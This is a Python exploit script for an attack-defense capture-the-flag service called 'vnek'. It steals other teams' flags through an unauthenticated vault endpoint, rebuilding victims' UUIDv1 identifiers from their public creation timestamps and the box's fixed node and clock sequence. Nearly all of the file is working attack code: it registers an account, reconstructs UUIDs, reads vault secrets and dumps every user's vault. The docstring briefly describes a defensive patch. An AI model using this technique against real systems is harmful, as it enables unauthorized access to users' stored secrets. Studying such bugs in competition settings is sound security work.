"""Exploit for the vnek service (Go "ВнеКонтакта", :28080) — steals a victim's
vault secret (= the flag) from another team's box.

THE BUG (predictable UUIDv1 -> vault BOLA). The checker stores the flag as a
user's `secret` (the "сейф"/vault). Reading it is gated to the owner now on a
PATCHED box, but the organizers shipped vnek with the vault readable by anyone
for an arbitrary ?uuid= (see the `handlers_vault.go` audit note: "returned ANY
user's secret for an arbitrary ?uuid= query parameter with NO authentication
check ... read their vault secret directly (full flag theft)"). Teams that did
not patch are still open. We don't even need to be given the uuid, because:

  * identity.Generator emits UUIDv1. node (6 bytes) and clock_seq come from an
    8-byte seed persisted in the DB, so they are FIXED for the whole box.
  * /api/users and /api/profile expose each user's `created` = CreatedAt(u.ID),
    i.e. the timestamp decoded straight out of the victim's own UUIDv1, at
    100 ns resolution (RFC3339Nano).
  * We learn this box's node+clock_seq from OUR OWN uuid (register -> the uuid
    is echoed by /api/register and /api/me).
  * => victim_uuid = assemble(victim.created, shared node, shared clock_seq).
    Exact, no brute force (verified 25000/25000 offline).

  Then: GET /api/vault?uuid=<victim_uuid> -> {"secret": "<FLAG>"}.

  CONFIRMED on the live box: the pre-patch handler is exactly
      u, _ := service.Vault(ctx, r.URL.Query().Get("uuid"))   // any uuid, no requireUser
      respond(200, {"uuid": u.ID, "secret": u.Secret})
  and victim-uuid reconstruction from a *different* user's node/clock_seq +
  the victim's public `created` reproduced the real uuid exactly.

flag_id semantics (robust to whatever attack_data gives):
  * a UUID            -> read that vault directly (no reconstruction needed).
  * a username        -> /api/profile -> created -> reconstruct uuid -> vault.
  * None / unknown    -> dump-all: /api/users -> reconstruct every uuid -> vault.

Patch (defense, see defense/): the vault endpoint must require auth AND only
return the caller's OWN secret (our box already does this in handlers_vault.go).
Belt-and-suspenders: stop leaking the raw v1 timestamp (expose only a coarse
date, or switch ids to UUIDv4 / random) so victim uuids can't be reconstructed
from public data at all.

Interface: exploit(host, port, flag_id) -> list[str]   # flag_id = uuid|username|None
Deps: requests (stdlib base64/re/uuid otherwise).
"""
import calendar
import random
import re
import string
import sys

import requests

FLAG_RE = re.compile(r"[A-Z0-9]{31}=")
TIMEOUT = 6
MAX_ENUM = 50                 # cap vaults dumped per round in dump-all mode
G1582 = 122192928000000000    # 100 ns ticks between the Gregorian (1582) and Unix epochs

# One registered session per box (gives us a cookie + this box's node/clock_seq).
# A box restart rotates neither (seed is persisted in Postgres), but the session
# dies; we detect that via /api/me and re-register.
_SESS = {}

_UUID_RE = re.compile(r"\A[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-"
                      r"[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\Z")
_TS_RE = re.compile(r"(\d{4})-(\d{2})-(\d{2})[Tt](\d{2}):(\d{2}):(\d{2})"
                    r"(?:\.(\d+))?([Zz]|[+-]\d{2}:?\d{2})?\Z")


def _rand(n=12):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def _scan(*values):
    out = []
    for v in values:
        if v:
            out.extend(FLAG_RE.findall(str(v)))
    return out


def _parse_rfc3339_ns(s):
    """RFC3339Nano -> integer unix nanoseconds (full 100 ns precision kept)."""
    if not isinstance(s, str):
        return None
    m = _TS_RE.match(s.strip())
    if not m:
        return None
    y, mo, d, h, mi, se = (int(m.group(i)) for i in range(1, 7))
    frac = (m.group(7) or "")[:9].ljust(9, "0")
    nsec = int(frac)
    tz = m.group(8)
    off = 0
    if tz and tz not in ("Z", "z"):
        sign = 1 if tz[0] == "+" else -1
        z = tz[1:].replace(":", "")
        off = sign * (int(z[:2]) * 3600 + int(z[2:4]) * 60)
    try:
        epoch = calendar.timegm((y, mo, d, h, mi, se, 0, 0, 0)) - off
    except (ValueError, OverflowError):
        return None
    return epoch * 1_000_000_000 + nsec


def _assemble_uuid(created, node6, cs2):
    """victim UUIDv1 from its public `created` + this box's node & clock_seq."""
    unix_ns = _parse_rfc3339_ns(created)
    if unix_ns is None or node6 is None or cs2 is None:
        return None
    tick = unix_ns // 100 + G1582
    b = bytearray(16)
    b[0:4] = (tick & 0xFFFFFFFF).to_bytes(4, "big")
    b[4:6] = ((tick >> 32) & 0xFFFF).to_bytes(2, "big")
    b[6:8] = (((tick >> 48) & 0x0FFF) | 0x1000).to_bytes(2, "big")   # version 1
    b[8:10] = cs2
    b[10:16] = node6
    h = b.hex()
    return "%s-%s-%s-%s-%s" % (h[0:8], h[8:12], h[12:16], h[16:20], h[20:32])


def _cs_candidates(cs2, span):
    """clock_seq is ~constant per box but can increment by a few on 100 ns
    collisions; try the exact value first, then a tiny decreasing window
    (older users were created with an equal-or-smaller clock_seq)."""
    if not cs2:
        return []
    base = ((cs2[0] & 0x3F) << 8) | cs2[1]
    out = []
    for dec in range(max(1, span)):
        v = (base - dec) & 0x3FFF
        out.append(bytes([0x80 | ((v >> 8) & 0x3F), v & 0xFF]))
    seen, uniq = set(), []
    for c in out:
        if c not in seen:
            seen.add(c)
            uniq.append(c)
    return uniq


def _uuid_bytes(u):
    try:
        return bytes.fromhex(str(u).replace("-", ""))
    except ValueError:
        return None


def _register(base):
    s = requests.Session()
    for _ in range(2):                             # retry once on the rare username clash
        try:
            r = s.post(base + "/api/register",
                       data={"username": "lab" + _rand(10), "password": _rand(16)},
                       timeout=TIMEOUT)
        except requests.RequestException:
            return None, None, None
        my_uuid = None
        if r.status_code == 200:
            try:
                my_uuid = r.json().get("uuid")
            except ValueError:
                my_uuid = None
            if not my_uuid:
                try:
                    my_uuid = s.get(base + "/api/me", timeout=TIMEOUT).json().get("id")
                except (ValueError, requests.RequestException):
                    my_uuid = None
            if my_uuid and _UUID_RE.match(my_uuid):
                raw = _uuid_bytes(my_uuid)
                if raw:
                    return s, raw[10:16], raw[8:10]   # node (6), clock_seq (2)
            return s, None, None                      # session ok, ids unknown
    return None, None, None


def _session(base, force=False):
    if not force:
        cached = _SESS.get(base)
        if cached:
            try:
                if cached["s"].get(base + "/api/me", timeout=TIMEOUT).status_code == 200:
                    return cached["s"], cached["node"], cached["cs"]
            except requests.RequestException:
                pass
    s, node, cs = _register(base)
    if s is not None:
        _SESS[base] = {"s": s, "node": node, "cs": cs}
    else:
        _SESS.pop(base, None)
    return s, node, cs


def _read_vault(s, base, victim_uuid):
    """The money shot: pull a (victim) user's secret. Works unauthenticated on
    the shipped/vulnerable build; we send our cookie too so a 'must be logged in
    but no ownership check' variant also yields. Returns any flags found."""
    out = []
    for param in ("uuid", "id"):                   # 'uuid' is the real one; 'id' is a cheap fallback
        try:
            r = s.get(base + "/api/vault", params={param: victim_uuid}, timeout=TIMEOUT)
        except requests.RequestException:
            continue
        if r.status_code == 200:
            try:
                j = r.json()
                out.extend(_scan(j.get("secret"), j.get("vault")))
            except ValueError:
                pass
            out.extend(_scan(r.text))
            if out:
                break
    return out


def _created_for_username(s, base, username):
    try:
        r = s.get(base + "/api/profile", params={"username": username}, timeout=TIMEOUT)
        if r.status_code == 200:
            return r.json().get("created")
    except (ValueError, requests.RequestException):
        pass
    return None


def _all_users(s, base):
    try:
        r = s.get(base + "/api/users", timeout=TIMEOUT)      # unauthenticated, lists everyone
        data = r.json()
    except (ValueError, requests.RequestException):
        return []
    out = []
    if isinstance(data, list):
        for u in data:
            if isinstance(u, dict):
                created = u.get("Created") or u.get("created")
                if created:
                    out.append(created)
            elif isinstance(u, (list, tuple)) and len(u) >= 3:
                out.append(u[2])                              # [Name, Display, Created]
    return out


def _target_vault(s, base, node, cs, victim_uuid=None, created=None, span=4):
    """Read one victim's vault, reconstructing the uuid from `created` if needed."""
    flags = []
    candidates = []
    if victim_uuid and _UUID_RE.match(str(victim_uuid)):
        candidates.append(str(victim_uuid))
    elif created is not None:
        for c in _cs_candidates(cs, span):
            u = _assemble_uuid(created, node, c)
            if u:
                candidates.append(u)
    for u in candidates:
        got = _read_vault(s, base, u)
        if got:
            flags.extend(got)
            break
    return flags


def exploit(host, port, flag_id):
    flags, seen = [], set()
    try:
        base = "http://%s:%s" % (host, port)       # %s: a bad port returns [] instead of raising
        fid = None if flag_id is None else str(flag_id).strip()

        # Fast path: flag_id already a uuid -> one vault read, no reconstruction.
        if fid and _UUID_RE.match(fid):
            s, _node, _cs = _session(base)
            if s is None:
                s = requests.Session()             # vuln build needs no auth; try anyway
            for f in _read_vault(s, base, fid):
                if f not in seen:
                    seen.add(f); flags.append(f)
            return flags

        s, node, cs = _session(base)
        if s is None:
            return flags
        if (node is None or cs is None) and _SESS.get(base):
            s, node, cs = _session(base, force=True)   # stale/incomplete -> re-register once
            if s is None:
                return flags

        if fid:
            # flag_id is a username: resolve its public `created`, reconstruct, read.
            created = _created_for_username(s, base, fid)
            if created:
                for f in _target_vault(s, base, node, cs, created=created, span=4):
                    if f not in seen:
                        seen.add(f); flags.append(f)
            if flags:
                return flags
            # fall through to dump-all if the username path yielded nothing

        # No id (or username missed): dump every user's vault we can reconstruct.
        for created in _all_users(s, base)[:MAX_ENUM]:
            for f in _target_vault(s, base, node, cs, created=created, span=2):
                if f not in seen:
                    seen.add(f); flags.append(f)
    except Exception:
        return flags
    return flags


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    p = int(sys.argv[2]) if len(sys.argv) > 2 else 28080
    fid = sys.argv[3] if len(sys.argv) > 3 else None
    for fl in exploit(h, p, fid):
        print(fl)
